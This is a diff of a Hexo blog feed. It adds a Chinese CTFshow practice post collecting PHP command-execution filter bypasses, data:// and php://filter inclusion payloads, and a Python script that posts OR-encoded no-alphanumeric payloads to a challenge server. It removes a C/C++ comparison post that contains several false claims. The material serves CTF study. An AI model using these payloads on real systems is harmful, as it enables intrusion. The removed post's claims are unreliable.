@@ -6,7 +6,7 @@
   <link href="https://liu1272.github.io/atom.xml" rel="self"/>
   
   <link href="https://liu1272.github.io/"/>
-  <updated>2023-03-27T17:23:34.473Z</updated>
+  <updated>2023-04-07T14:33:42.730Z</updated>
   <id>https://liu1272.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CTFshow刷题记录</title>
+    <link href="https://liu1272.github.io/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
+    <id>https://liu1272.github.io/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
+    <published>2023-04-07T11:51:00.000Z</published>
+    <updated>2023-04-07T14:33:42.730Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="本文会一直更新，不会分开多个文章记载刷题记录"><a href="#本文会一直更新，不会分开多个文章记载刷题记录" class="headerlink" title="本文会一直更新，不会分开多个文章记载刷题记录"></a>本文会一直更新，不会分开多个文章记载刷题记录</h4><h5 id="文章只记载最简单的最重要的思路"><a href="#文章只记载最简单的最重要的思路" class="headerlink" title="文章只记载最简单的最重要的思路"></a>文章只记载最简单的最重要的思路</h5><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5><p>既然是信息泄露，自然不会很难，基本上都是工具一把嗦。</p><pre><code>F12robots.txtjs抓包index.phpswww.zip.git.svnindex.php.swpindex.php.bak.index.php.swo.index.php.swn.DS_Store.hg邮箱，电话号码泄露技术文档editor编辑器探针backup.sql/db/db.mdb抓包返回状态</code></pre><h5 id="爆破-BP"><a href="#爆破-BP" class="headerlink" title="爆破(BP)"></a>爆破(BP)</h5><p>爆破简单的用BP完全足够了，难一点的写个Python脚本。</p><pre><code>Payload set         ----&gt;  custom iterator(自定义迭代器)需要进行base64编码  ----&gt;  payload processing 进行编码设置取消Palyload Encoding编码,因为在进行base64加密的时候在最后可能存在 == 会影响base64加密的结果有多重目录的url可以用number爆破出动态地址，同时记得改一下页面index.php</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p><pre><code>【过滤变量名】重构变量?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;匹配符绕过?c=echo `cat fl&#39;&#39;ag.php`;?c=echo `cat fl/ag.txt`;?c=echo `cat fl*`;【过滤system】system()assert()passthru()exec()           //只执行无回显shell_exec()     // 只执行无回显popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );proc_open()      //不会直接返回执行结果，而是返回一个文件指针pcntl_exec()call_user_func()还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt【过滤cat】more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261  //报错出文件内容strings:可以查看rev:反过来看新增一个xxd可以读取文件curl file:///flag 也行bash -v /etc/passwddate -f 好像可以越权读取文件【过滤空格】%09%20$IFS$&#123;IFS&#125;$IFS$9$IFS$1&lt;&lt;&gt;【过滤;】使用?&gt;替换，因为最后一句不用分号include，也就是说应该传入一个文件名include的文件中出错了但是主程序会继续往下执行【过滤括号】使用不用括号的函数(伪协议)?c=php://filter/read=convert.base64-encode/resource=flag.php伪协议也可以重构变量?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt【PHP伪协议】file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流【文件按包含漏洞】使用data://协议执行PHP代码?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志此处让网页直接包含我们写入的代码，从而执行恶意命令但是仍然要绕过对flag的过滤【常用套娃函数】get_defined_vars() 返回一个包含所有已定义变量列表的多维数组array_pop() 是删除并返回数组最后一个元素current() 返回数组中的当前元素的值。别名是pos()next() 返回数组中的下一个元素的值。end()最后一个scandir() 函数返回指定目录中的文件和目录的数组。print_r() 函数用于打印变量，以更容易理解的形式展示。localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）current() 函数返回数组中的当前元素的值。别名是pos()array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。read_file()  读出源码highlight_file()  读出源码show_source()  读出源码【套娃例子】           要使用POST传参?c=eval(array_pop(next(get_defined_vars())));cmd=system(“cat flag.php”);           不使用POST传参时?c=show_source(next(array_reverse(scandir(pos(localeconv())))));           在COOKIE处传马/?c=show_source(session_id(session_start()));再把PHPSSID值设为flag.php</code></pre><p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p><pre class="line-numbers language-Python"><code class="language-Python">import reimport urllibimport requestsfrom urllib import parse## hex_i = ""# hex_j = ""# pattern='/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&|\-/i'# str1=["system","cat flag.php"]# for p in range(2):#     t1 = ""#     t2 = ""#     for k in str1[p]:#         for i in range(256):#             for j in range(256):#                 if re.search(pattern,chr(i)) :#                     break#                 if re.search(pattern,chr(j)) :#                     continue#                 if i < 16:#                     hex_i = "0" + hex(i)[2:]#                 else:#                     hex_i=hex(i)[2:]#                 if j < 16:#                     hex_j="0"+hex(j)[2:]#                 else:#                     hex_j=hex(j)[2:]#                 hex_i='%'+hex_i#                 hex_j='%'+hex_j#                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))#                 if(c ==k):#                     t1=t1+hex_i#                     t2=t2+hex_j#                     break#             else:#                 continue#             break#     payload = "(\""+t1+"\"|\""+t2+"\")"#     print(payload)payload='("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%06%0c%01%07%00%10%08%10"|"%60%60%60%20%60%60%60%60%2e%60%60%60")'print(payload)data=&#123;    "c":urllib.parse.unquote(payload)&#125;url="http://9fdf5bf0-5dfe-4203-ae04-41501a9f6768.challenge.ctf.show/"re=requests.post(url,data=data)print(re.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h4 id=&quot;本文会一直更新，不会分开多个文章记载刷题记录&quot;&gt;&lt;a href=&quot;#本文会一直更新，不会分开多个文章记载刷题记录&quot; class=&quot;headerlink&quot; title=&quot;本文会一直更新，不会分开多个文章记载刷题记录&quot;&gt;&lt;/a&gt;本文会一直更新，不会分开多个文章记载刷题</summary>
+      
+    
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>NKCTF2023WP</title>
@@ -433,30 +457,6 @@
       
       
     <summary type="html">&lt;h4 id=&quot;总述&quot;&gt;&lt;a href=&quot;#总述&quot; class=&quot;headerlink&quot; title=&quot;总述&quot;&gt;&lt;/a&gt;总述&lt;/h4&gt;&lt;p&gt;网络编程，几乎所有网络的通信本质上都是通过socket模块实现。&lt;br&gt;并发编程，将串行的程序变为并发,提升代码执行的效率。&lt;br&gt;线程是计</summary>
-      
-    
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>C&amp;C++</title>
-    <link href="https://liu1272.github.io/2023/03/03/C-C/"/>
-    <id>https://liu1272.github.io/2023/03/03/C-C/</id>
-    <published>2023-03-02T16:27:00.000Z</published>
-    <updated>2023-03-10T11:39:19.595Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="C和C-的部分差别"><a href="#C和C-的部分差别" class="headerlink" title="C和C++的部分差别"></a>C和C++的部分差别</h4><h5 id="1-存储类"><a href="#1-存储类" class="headerlink" title="1.存储类"></a>1.存储类</h5><p><em>存储类定义程序</em>中变量/函数的范围（可见性）和生命周期。<br>C++比较C多了mutable和thread_local类型</p><pre><code>mutable 说明符仅适用于类的对象，使用 thread_local 说明符声明的变量仅可在它在其上创建的线程上访问。 </code></pre><p>注意:<br>从 C++ 17 开始，auto 关键字不再是 C++ 存储类说明符，且 register 关键字被弃用。<br>thread_local用于C++11</p><h5 id="2-函数参数的调用"><a href="#2-函数参数的调用" class="headerlink" title="2.函数参数的调用"></a>2.函数参数的调用</h5><p>C++可以指针调用。<br>该方法把参数的地址赋值给形式参数。在函数内，该地址用于访问调用中要用到的实际参数。这意味着，修改形式参数会影响实际参数。<br>C不可以使用指针调用。</p><h5 id="3-指针"><a href="#3-指针" class="headerlink" title="3.指针"></a>3.指针</h5><p>C++比较C能够支持空指针。NULL 指针是一个定义在标准库中的值为零的常量。</p><h5 id="4-头文件"><a href="#4-头文件" class="headerlink" title="4.头文件"></a>4.头文件</h5><pre><code>【C】#include &lt;stdio.h&gt;      引用系统头文件。它在系统目录的标准列表中搜索名为 file 的文件。#include &quot;xxxxx&quot;        引用用户头文件。它在包含当前文件的目录中搜索名为 file 的文件。【C++】 头文件      函数和描述iostream    该文件定义了 cin、cout、cerr 和 clog 对象，分别对应于标准输入流、标准输出流、非缓冲标准错误流和缓冲标准错误流。iomanip     该文件通过所谓的参数化的流操纵器（比如 setw 和 setprecision），来声明对执行标准化 I/O 有用的服务。fstream     该文件为用户控制的文件处理声明服务。我们将在文件和流的相关章节讨论它的细节。</code></pre><h5 id="5-输入输出"><a href="#5-输入输出" class="headerlink" title="5.输入输出"></a>5.输入输出</h5><pre><code>            【C】        【C++】标准输入    stdin          cin           键盘标准输出    stdout         cout          屏幕标准错误    stderr         cerr          您的屏幕</code></pre><h6 id="6-文件读写"><a href="#6-文件读写" class="headerlink" title="6.文件读写"></a>6.文件读写</h6><p>C与C++的文件操作都属于面向对象，使用起来较为繁琐，需要记住很多函数。<br>对文件的操作都分为三个步骤:打开文件&gt;操作文件&gt;关闭文件</p><pre><code>【C】FILE *fopen( const char *filename, const char *mode );//要打开的文件名,不指定路径,则在当前文件夹找//打开的模式 读r 写w 或追加a//返回值:打开失败返回NULL,打开成功则返回指向文件的标识符int fputc( int c, FILE *fp );//写入文件int fclose( FILE *fp );//关闭文件【C++】int main() &#123;    fstream file;    file.open(&quot;filename&quot;,ios::mode); //以只写模式打开文件    char buf[] = &quot;内容&quot;;    file.write(buf,sizeof(buf));       //写入文件末尾    file.read(buf,mode);              //读文件    file.close();                      //关闭文件&#125;//modeapp      每次写入前寻位到流结尾binary   以二进制模式打开in       以读打开out      以写打开trunc    在打开时舍弃流的内容ate      打开后立即寻位到流结尾</code></pre><h6 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7.异常处理"></a>7.异常处理</h6><p>C++有一个应对出现错误的机制，叫做异常处理。当程序运行发生错误时，可以抛出一个异常，异常处理程序会捕捉它并采取相应的措施。C语言并没有内置的异常机制。</p><h5 id="8-编译器"><a href="#8-编译器" class="headerlink" title="8.编译器"></a>8.编译器</h5><p>C语言和C++语言的编译器可不同。尽管有些编译器支持两种语言，但某些特征可能仅仅由一个语言所支持。</p><h5 id="9-名称空间"><a href="#9-名称空间" class="headerlink" title="9.名称空间"></a>9.名称空间</h5><p>C++有一个关键字叫做namespace，用于区分相同名称的函数和变量。C语言中没有这个特性。</p><h5 id="10-头文件"><a href="#10-头文件" class="headerlink" title="10.头文件"></a>10.头文件</h5><p>在C++中，头文件可以有任何扩展名，而在C语言中，它们必须是.h扩展名。</p><h5 id="11-默认变量初始化"><a href="#11-默认变量初始化" class="headerlink" title="11.默认变量初始化"></a>11.默认变量初始化</h5><p>在C++中，类的成员变量默认情况下会被初始化。而在C语言中，变量的内容是未定义的，程序可能会因此出现意外错误。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>C++语言是C语言的扩展，它包含了所有C语言的特性，并增加了一些特有的特性。C++是一个更为现代化的语言，用于更复杂的编程环境，特别是当需要面向对象编程时，C++是首选语言。而C语言则侧重于系统编程，嵌入式编程等。</p><h5 id="我只是刚开始学习C与C-，如果发现错误请在Github仓库中找到我。"><a href="#我只是刚开始学习C与C-，如果发现错误请在Github仓库中找到我。" class="headerlink" title="我只是刚开始学习C与C++，如果发现错误请在Github仓库中找到我。"></a>我只是刚开始学习C与C++，如果发现错误请在Github仓库中找到我。</h5>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h4 id=&quot;C和C-的部分差别&quot;&gt;&lt;a href=&quot;#C和C-的部分差别&quot; class=&quot;headerlink&quot; title=&quot;C和C++的部分差别&quot;&gt;&lt;/a&gt;C和C++的部分差别&lt;/h4&gt;&lt;h5 id=&quot;1-存储类&quot;&gt;&lt;a href=&quot;#1-存储类&quot; class=&quot;head</summary>
       
     
     
